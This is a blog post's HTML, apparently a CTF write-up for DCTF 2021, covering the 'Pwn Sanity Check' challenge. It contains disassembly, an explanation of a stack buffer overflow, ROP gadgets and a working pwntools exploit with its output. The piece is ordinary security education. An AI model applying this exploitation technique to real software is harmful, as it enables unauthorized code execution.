






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>DCTF - 2021 &middot; Congo</title>
    <meta name="title" content="DCTF - 2021 &middot; Congo" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
  />
  
  
  
  
  
  
  
  <meta
    name="description"
    content="
      
        I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.
      
    "
  />
  
  
  
  <link rel="canonical" href="//localhost:1313/blog/ductf/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/blog/ductf/">
  <meta property="og:site_name" content="Congo">
  <meta property="og:title" content="DCTF - 2021">
  <meta property="og:description" content="I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2021-05-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-05-07T00:00:00+00:00">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="DCTF - 2021">
<meta name="twitter:description" content="I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blogs",
    "name": "DCTF - 2021",
    "headline": "DCTF - 2021",
    
    "abstract": "I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/blog\/ductf\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2021",
    "dateCreated": "2021-05-07T00:00:00\u002b00:00",
    "datePublished": "2021-05-07T00:00:00\u002b00:00",
    
    "dateModified": "2021-05-07T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "4898"
  }
  </script>


  
  
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Congo</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href=""
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                
                
              
            </li>
          
            
              
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        DCTF - 2021
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2021-05-07 00:00:00 &#43;0000 UTC">7 May 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">23 mins</span>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on. In the end, I manage to solve 7/8 pwn challenges and remaining one was solved by Faith, super talented guy.</p>
<!-- more -->
<h3 id="pwn-sanity-check" class="relative group">Pwn Sanity Check <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pwn-sanity-check" aria-label="Anchor">#</a></span></h3><p>This was more of a sanity check challenge for the pwn challenges, this was ridiculously easy:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078c</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078d</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400790</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400795</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040079a</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400580</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040079f</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007a4</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400730</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007a9</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007ae</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007af</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400730</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400731</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400734</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x40</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400738</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1d1</span><span class="p">]</span>        <span class="c1"># 0x400910
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040073f</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400744</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200915</span><span class="p">]</span>        <span class="c1"># 0x601060 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040074b</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040074f</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400754</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400757</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400590</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040075c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0xdeadc0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400763</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x40077d</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">77</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400765</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b4</span><span class="p">]</span>        <span class="c1"># 0x400920
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040076c</span> <span class="err">&lt;+</span><span class="mi">60</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400771</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400776</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4006f4</span> <span class="p">&lt;</span><span class="no">shell</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040077b</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x400789</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">89</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040077d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1c1</span><span class="p">]</span>        <span class="c1"># 0x400945
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000400784</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400789</span> <span class="err">&lt;+</span><span class="mi">89</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000040078b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>First off the main function calls the vuln function which takes the input from the fgets, there was a buffer overflow vulnerability in the fgets call since the buffer was of size 0x40, while the size fgets takes is 0x100 making it vulnerable to stack overflow. In the vuln function it checks if the rbp - 0x4 has the value 0xdeadc0de which calls the shell function it the value turns out to be same but the shell function wasn’t spawning shell, it turns out to be troll function. Next up, there was a win function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">win</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400697</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400698</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069b</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069f</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a2</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">esi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a5</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x18c</span><span class="p">]</span>        <span class="c1"># 0x400838
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006ac</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b1</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0xdeadbeef</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b8</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4006f1</span> <span class="p">&lt;</span><span class="no">win</span><span class="p">+</span><span class="mi">90</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ba</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b7</span><span class="p">]</span>        <span class="c1"># 0x400878
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006c1</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c6</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006cd</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4006f1</span> <span class="p">&lt;</span><span class="no">win</span><span class="p">+</span><span class="mi">90</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006cf</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b7</span><span class="p">]</span>        <span class="c1"># 0x40088d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006d6</span> <span class="err">&lt;+</span><span class="mi">63</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006db</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1bc</span><span class="p">]</span>        <span class="c1"># 0x40089e
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006e2</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006e7</span> <span class="err">&lt;+</span><span class="mi">80</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4005a0</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f1</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f2</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004006f3</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>This function spawns a shell /bin/sh but only if the given argument to the function will be equivalent to 0xdeadbeef and 0x1337c0de respectively. In order to do so, we find the gadgets using ropper, since the binary is 64 bit, the calling convention of the 64 bit architecture says 1st argument for a function calls goes to the rdi while the second goes to rsi and so on. We find two useful gadgets here:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0000000000400813:</span> <span class="nf">pop</span> <span class="no">rdi</span><span class="c1">; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400811:</span> <span class="nf">pop</span> <span class="no">rsi</span><span class="c1">; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">Now</span><span class="p">,</span> <span class="no">we</span> <span class="no">can</span> <span class="no">just</span> <span class="no">create</span> <span class="no">a</span> <span class="no">ROP</span> <span class="no">chain</span> <span class="no">and</span> <span class="no">give</span> <span class="no">the</span> <span class="no">value</span> <span class="mi">0xdeadbeef</span> <span class="no">to</span> <span class="no">the</span> <span class="no">rdi</span> <span class="no">and</span> <span class="mi">0x1337c0de</span> <span class="no">to</span> <span class="no">the</span> <span class="no">rsi</span> <span class="no">and</span> <span class="no">give</span> <span class="no">any</span> <span class="no">junk</span> <span class="no">value</span> <span class="no">to</span> <span class="no">the</span> <span class="no">r15</span> <span class="no">since</span> <span class="no">it</span> <span class="no">doesn</span><span class="err">’</span><span class="no">t</span> <span class="no">matter</span> <span class="no">what</span> <span class="no">r15</span> <span class="no">holds</span><span class="p">,</span> <span class="no">the</span> <span class="no">exploit</span> <span class="no">was</span> <span class="no">as</span> <span class="no">follows</span><span class="p">:-</span>
</span></span><span class="line"><span class="cl"><span class="nf">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">from</span> <span class="no">pwn</span> <span class="no">import</span> <span class="p">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">p</span> <span class="err">=</span> <span class="no">remote</span><span class="p">(</span><span class="err">&#34;</span><span class="no">dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io</span><span class="err">&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">=</span> <span class="no">b</span><span class="err">&#34;</span><span class="no">A</span><span class="err">&#34;</span><span class="p">*</span><span class="mi">72</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x0000000000400813</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x0000000000400811</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x1337c0de</span><span class="p">)*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nf">payload</span> <span class="err">+=</span> <span class="no">p64</span><span class="p">(</span><span class="mi">0x400697</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">p.recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">p.sendline</span><span class="p">(</span><span class="no">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">p.interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">pwn_sanity.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">will</span> <span class="no">this</span> <span class="no">work</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">made</span> <span class="no">it</span> <span class="no">to</span> <span class="no">win</span> <span class="no">land</span><span class="p">,</span> <span class="no">no</span> <span class="no">free</span> <span class="no">handouts</span> <span class="no">this</span> <span class="no">time</span><span class="p">,</span> <span class="no">try</span> <span class="no">harder</span>
</span></span><span class="line"><span class="cl"><span class="nf">one</span> <span class="no">down</span><span class="p">,</span> <span class="no">one</span> <span class="no">to</span> <span class="no">go</span><span class="p">!</span>
</span></span><span class="line"><span class="cl"><span class="err">2/2</span> <span class="nf">bro</span> <span class="no">good</span> <span class="no">job</span>
